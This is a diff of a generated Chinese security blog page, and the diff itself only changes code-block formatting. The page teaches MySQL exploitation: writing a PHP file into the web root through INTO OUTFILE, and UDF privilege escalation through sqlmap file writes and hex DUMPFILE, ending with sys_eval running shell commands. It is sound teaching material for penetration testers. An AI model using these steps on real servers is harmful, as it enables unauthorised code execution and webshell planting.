@@ -154,7 +154,7 @@
   localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
   translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
   noticeOutdate: undefined,
-  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":true,"highlightMacStyle":false},
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":true,"highlightMacStyle":true},
   copy: {
     success: '复制成功',
     error: '复制错误',
@@ -234,9 +234,9 @@
 <li>网站路径有写入权限</li>
 </ul>
 <p>查看<code>secure_file_priv</code> ：</p>
-<pre><code class="highlight mysql">SELECT * FROM INFORMATION_SCHEMA.GLOBAL_VARIABLES WHERE VARIABLE_NAME = 'secure_file_priv';</code></pre>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM INFORMATION_SCHEMA.GLOBAL_VARIABLES WHERE VARIABLE_NAME = 'secure_file_priv';</span><br></pre></td></tr></tbody></table></figure>
 
-<pre><code class="highlight mysql">show global variables like '%secure_file_priv%';</code></pre>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables like '%secure_file_priv%';</span><br></pre></td></tr></tbody></table></figure>
 
 <p><code>secure_file_priv</code>的值决定了文件是否可以写入：</p>
 <table>
@@ -265,10 +265,10 @@
 </blockquote>
 <p><code>MariaDB</code>的<code>secure_file_priv</code>默认一直是空。</p>
 <p>以写马为例，上述条件都满足的话，可以这样写入：</p>
-<pre><code class="highlight mysql">select '&lt;?php phpinfo(); ?&gt;' into outfile '/var/www/html/info.php';</code></pre>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select '&lt;?php phpinfo(); ?&gt;' into outfile '/var/www/html/info.php';</span><br></pre></td></tr></tbody></table></figure>
 
 <p><code>sqlmap</code>里这么操作：</p>
-<pre><code class="highlight mysql">select '&lt;?php phpinfo(); ?&gt;' into outfile '/var/www/html/info.php';</code></pre>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select '&lt;?php phpinfo(); ?&gt;' into outfile '/var/www/html/info.php';</span><br></pre></td></tr></tbody></table></figure>
 
 <h1 id="0x02-UDF提权"><a href="#0x02-UDF提权" class="headerlink" title="0x02 UDF提权"></a>0x02 UDF提权</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p><strong>UDF</strong>：</p>
 <p><code>UDF（User-Defined Function）</code>是用户自定义函数的缩写。在数据库管理系统中，<code>UDF</code> 是用户定义的函数，可以扩展数据库的功能。用户可以编写自己的函数，并在 <code>SQL</code> 查询中像内置函数一样使用这些函数。</p>
@@ -283,36 +283,12 @@
 </ol>
 <h2 id="获得动态链接库"><a href="#获得动态链接库" class="headerlink" title="获得动态链接库"></a>获得动态链接库</h2><p><code>sqlmap</code>自带动态链接库，但是被加密了。</p>
 <p>解码方式如下：</p>
-<pre><code class="highlight bash"><span class="comment"># 查看当前目录情况</span>
-➜ <span class="built_in">pwd</span>
-/Users/guang/Documents/X1ct34m/sqlmap/1.4.6/extra/cloak
-
-<span class="comment"># 解码 32 位的 Linux 动态链接库</span>
-➜ python3 cloak.py -d -i ../../data/udf/mysql/linux/32/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_32.so
-
-<span class="comment"># 解码 64 位的 Linux 动态链接库</span>
-➜ python3 cloak.py -d -i ../../data/udf/mysql/linux/64/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_64.so
-
-<span class="comment"># 解码 32 位的 Windows 动态链接库</span>
-➜ python3 cloak.py -d -i ../../data/udf/mysql/windows/32/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_32.dll
-
-<span class="comment"># 解码 64 位的 Windows 动态链接库</span>
-➜ python3 cloak.py -d -i ../../data/udf/mysql/windows/64/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_64.dll
-
-<span class="comment"># 查看当前目录下的情况</span>
-➜ <span class="built_in">ls</span>
-README.txt              cloak.py                lib_mysqludf_sys_32.so  lib_mysqludf_sys_64.so
-__init__.py             lib_mysqludf_sys_32.dll lib_mysqludf_sys_64.dll</code></pre>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看当前目录情况</span></span><br><span class="line">➜ <span class="built_in">pwd</span></span><br><span class="line">/Users/guang/Documents/X1ct34m/sqlmap/1.4.6/extra/cloak</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解码 32 位的 Linux 动态链接库</span></span><br><span class="line">➜ python3 cloak.py -d -i ../../data/udf/mysql/linux/32/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_32.so</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解码 64 位的 Linux 动态链接库</span></span><br><span class="line">➜ python3 cloak.py -d -i ../../data/udf/mysql/linux/64/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_64.so</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解码 32 位的 Windows 动态链接库</span></span><br><span class="line">➜ python3 cloak.py -d -i ../../data/udf/mysql/windows/32/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_32.dll</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解码 64 位的 Windows 动态链接库</span></span><br><span class="line">➜ python3 cloak.py -d -i ../../data/udf/mysql/windows/64/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_64.dll</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看当前目录下的情况</span></span><br><span class="line">➜ <span class="built_in">ls</span></span><br><span class="line">README.txt              cloak.py                lib_mysqludf_sys_32.so  lib_mysqludf_sys_64.so</span><br><span class="line">__init__.py             lib_mysqludf_sys_32.dll lib_mysqludf_sys_64.dll</span><br></pre></td></tr></tbody></table></figure>
 
 <p>给个国光师傅制作的链接，可以直接得到解密后的数据：</p>
 <p><a target="_blank" rel="noopener" href="https://sqlsec.lanzoux.com/i4b7jhyhwid">https://sqlsec.lanzoux.com/i4b7jhyhwid</a></p>
 <h2 id="寻找插件目录"><a href="#寻找插件目录" class="headerlink" title="寻找插件目录"></a>寻找插件目录</h2><p>接下来我们要把 <code>UDF</code> 的动态链接库文件放到 <code>MySQL</code> 的插件目录下，插件目录在哪里呢？可以使用如下的 <code>SQL</code> 语句来查询：</p>
-<pre><code class="highlight sql">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">'%plugin%'</span>;
-<span class="operator">+</span><span class="comment">---------------+------------------------------+</span>
-<span class="operator">|</span> Variable_name <span class="operator">|</span> <span class="keyword">Value</span>                        <span class="operator">|</span>
-<span class="operator">+</span><span class="comment">---------------+------------------------------+</span>
-<span class="operator">|</span> plugin_dir    <span class="operator">|</span> <span class="operator">/</span>usr<span class="operator">/</span><span class="keyword">local</span><span class="operator">/</span>mysql<span class="operator">/</span>lib<span class="operator">/</span>plugin<span class="operator">/</span> <span class="operator">|</span>
-<span class="operator">+</span><span class="comment">---------------+------------------------------+</span></code></pre>
+<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">'%plugin%'</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+------------------------------+</span></span><br><span class="line"><span class="operator">|</span> Variable_name <span class="operator">|</span> <span class="keyword">Value</span>                        <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+------------------------------+</span></span><br><span class="line"><span class="operator">|</span> plugin_dir    <span class="operator">|</span> <span class="operator">/</span>usr<span class="operator">/</span><span class="keyword">local</span><span class="operator">/</span>mysql<span class="operator">/</span>lib<span class="operator">/</span>plugin<span class="operator">/</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+------------------------------+</span></span><br></pre></td></tr></tbody></table></figure>
 
 <p>如果不存在的话需要自己写一个，读者可以去看国光师傅的原文（文章最后）。</p>
 <h2 id="写入动态链接库"><a href="#写入动态链接库" class="headerlink" title="写入动态链接库"></a>写入动态链接库</h2><p>有两种方法：</p>
@@ -326,33 +302,24 @@ __init__.py             lib_mysqludf_sys_32.dll lib_mysqludf_sys_64.dll</code></
 <li><code>plugin</code> 目录可写且需要 <code>secure_file_priv</code> 无限制，<code>MySQL</code> 插件目录可以被 <code>MySQL</code> 用户写入。</li>
 <li>因为 <code>GET</code> 有<strong>字节长度限制</strong>，所以往往 <code>POST</code> 注入才可以执行这种攻击</li>
 </ul>
-<pre><code class="highlight bash">sqlmap -u <span class="string">"http://localhost:30008/"</span> --data=<span class="string">"id=1"</span> --file-write=<span class="string">"/Users/sec/Desktop/lib_mysqludf_sys_64.so"</span> --file-dest=<span class="string">"/usr/lib/mysql/plugin/udf.so"</span></code></pre>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://localhost:30008/"</span> --data=<span class="string">"id=1"</span> --file-write=<span class="string">"/Users/sec/Desktop/lib_mysqludf_sys_64.so"</span> --file-dest=<span class="string">"/usr/lib/mysql/plugin/udf.so"</span></span><br></pre></td></tr></tbody></table></figure>
 
 <p>如果没有注入点的话，只能在终端手工敲。</p>
-<h3 id="手工写入"><a href="#手工写入" class="headerlink" title="手工写入"></a>手工写入</h3><pre><code class="highlight sql"># 直接 <span class="keyword">SELECT</span> 查询十六进制写入
-<span class="keyword">SELECT</span> <span class="number">0x7f454c4602</span>... <span class="keyword">INTO</span> DUMPFILE <span class="string">'/usr/lib/mysql/plugin/udf.so'</span>;
-
-# 解码十六进制再写入多此一举
-<span class="keyword">SELECT</span> unhex(<span class="string">'7f454c4602...'</span>) <span class="keyword">INTO</span> DUMPFILE <span class="string">'/usr/lib/mysql/plugin/udf.so'</span>;</code></pre>
+<h3 id="手工写入"><a href="#手工写入" class="headerlink" title="手工写入"></a>手工写入</h3><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 直接 <span class="keyword">SELECT</span> 查询十六进制写入</span><br><span class="line"><span class="keyword">SELECT</span> <span class="number">0x7f454c4602</span>... <span class="keyword">INTO</span> DUMPFILE <span class="string">'/usr/lib/mysql/plugin/udf.so'</span>;</span><br><span class="line"></span><br><span class="line"># 解码十六进制再写入多此一举</span><br><span class="line"><span class="keyword">SELECT</span> unhex(<span class="string">'7f454c4602...'</span>) <span class="keyword">INTO</span> DUMPFILE <span class="string">'/usr/lib/mysql/plugin/udf.so'</span>;</span><br></pre></td></tr></tbody></table></figure>
 
 <p>这里挂一个国光师傅的链接，他把这些都写好了，拿来直接用：</p>
 <p><a target="_blank" rel="noopener" href="https://www.sqlsec.com/tools/udf.html">https://www.sqlsec.com/tools/udf.html</a></p>
 <h2 id="创建自定义函数并调用命令"><a href="#创建自定义函数并调用命令" class="headerlink" title="创建自定义函数并调用命令"></a>创建自定义函数并调用命令</h2><p>创建自定义函数：</p>
-<pre><code class="highlight sql">mysql <span class="operator">&gt;</span> <span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> sys_eval <span class="keyword">RETURNS</span> STRING SONAME <span class="string">'udf.dll'</span>;</code></pre>
+<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql <span class="operator">&gt;</span> <span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> sys_eval <span class="keyword">RETURNS</span> STRING SONAME <span class="string">'udf.dll'</span>;</span><br></pre></td></tr></tbody></table></figure>
 
 <p>查看是否创建成功：</p>
-<pre><code class="highlight sql">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mysql.func;
-<span class="operator">+</span><span class="comment">----------+-----+---------+----------+</span>
-<span class="operator">|</span> name     <span class="operator">|</span> ret <span class="operator">|</span> dl      <span class="operator">|</span> type     <span class="operator">|</span>
-<span class="operator">+</span><span class="comment">----------+-----+---------+----------+</span>
-<span class="operator">|</span> sys_eval <span class="operator">|</span>   <span class="number">0</span> <span class="operator">|</span> udf.dll <span class="operator">|</span> <span class="keyword">function</span> <span class="operator">|</span>
-<span class="operator">+</span><span class="comment">----------+-----+---------+----------+</span></code></pre>
+<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mysql.func;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-----+---------+----------+</span></span><br><span class="line"><span class="operator">|</span> name     <span class="operator">|</span> ret <span class="operator">|</span> dl      <span class="operator">|</span> type     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-----+---------+----------+</span></span><br><span class="line"><span class="operator">|</span> sys_eval <span class="operator">|</span>   <span class="number">0</span> <span class="operator">|</span> udf.dll <span class="operator">|</span> <span class="keyword">function</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-----+---------+----------+</span></span><br></pre></td></tr></tbody></table></figure>
 
 <p>执行命令：</p>
-<pre><code class="highlight bash">mysql &gt; <span class="keyword">select</span> sys_eval(<span class="string">'whoami'</span>);</code></pre>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql &gt; <span class="keyword">select</span> sys_eval(<span class="string">'whoami'</span>);</span><br></pre></td></tr></tbody></table></figure>
 
 <p>如果要删除自定义函数：</p>
-<pre><code class="highlight sql">mysql <span class="operator">&gt;</span> <span class="keyword">drop</span> <span class="keyword">function</span> sys_eval;</code></pre>
+<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql <span class="operator">&gt;</span> <span class="keyword">drop</span> <span class="keyword">function</span> sys_eval;</span><br></pre></td></tr></tbody></table></figure>
 
 
 
